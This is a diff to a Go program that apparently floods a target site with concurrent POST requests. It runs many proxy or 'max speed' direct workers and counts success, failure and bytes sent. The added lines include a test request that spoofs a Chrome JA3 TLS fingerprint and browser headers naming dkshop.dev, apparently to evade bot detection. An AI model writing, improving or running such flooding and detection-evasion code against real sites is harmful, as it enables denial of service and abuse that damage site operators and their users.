@@ -241,7 +241,13 @@ var (
 
 func getCycleTLSClient() cycletls.CycleTLS {
 	clientOnce.Do(func() {
+		fmt.Println("[DEBUG] Initializing CycleTLS client...")
 		cycleTLSClient = cycletls.Init()
+		if cycleTLSClient.ReqChan == nil {
+			fmt.Println("[ERROR] CycleTLS failed to initialize!")
+		} else {
+			fmt.Println("[DEBUG] CycleTLS initialized successfully")
+		}
 	})
 	return cycleTLSClient
 }
@@ -274,11 +280,18 @@ func workerDirect() {
 
 		if err != nil {
 			atomic.AddInt64(&statFail, 1)
+			if atomic.LoadInt64(&statFail) <= 5 {
+				fmt.Printf("\n[DEBUG] Request failed: %v\n", err)
+			}
 			continue
 		}
 
 		atomic.AddInt64(&statBytes, int64(len(response.Body)+len(body)))
 		atomic.AddInt64(&statSuccess, 1)
+
+		if atomic.LoadInt64(&statSuccess) <= 3 {
+			fmt.Printf("\n[DEBUG] Success! Status: %d, Body length: %d\n", response.Status, len(response.Body))
+		}
 	}
 }
 
@@ -427,11 +440,41 @@ func main() {
 		}()
 
 		start := time.Now()
+		fmt.Printf("[*] Starting %d proxy workers...\n", WORKERS)
 		for i := 0; i < WORKERS; i++ { go workerProxy() }
 		statsLoop(start, true)
 	} else {
 		fmt.Println("[*] Direct mode - max speed")
+		fmt.Println("[*] Testing connection first...")
+
+		// Test 1 request trước
+		testClient := getCycleTLSClient()
+		if testClient.ReqChan == nil {
+			fmt.Println("[ERROR] CycleTLS not available, exiting...")
+			return
+		}
+
+		testBody := buildBody()
+		testResp, testErr := testClient.Do(TARGET_URL, cycletls.Options{
+			Body:      testBody,
+			Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
+			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+			Headers: map[string]string{
+				"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+				"Origin":       "https://dkshop.dev",
+				"Referer":      "https://dkshop.dev/",
+			},
+		}, "POST")
+
+		if testErr != nil {
+			fmt.Printf("[ERROR] Test request failed: %v\n", testErr)
+			fmt.Println("[*] Continuing anyway...")
+		} else {
+			fmt.Printf("[SUCCESS] Test request OK! Status: %d, Body: %d bytes\n", testResp.Status, len(testResp.Body))
+		}
+
 		start := time.Now()
+		fmt.Printf("[*] Starting %d direct workers...\n", WORKERS)
 		for i := 0; i < WORKERS; i++ { go workerDirect() }
 		statsLoop(start, false)
 	}
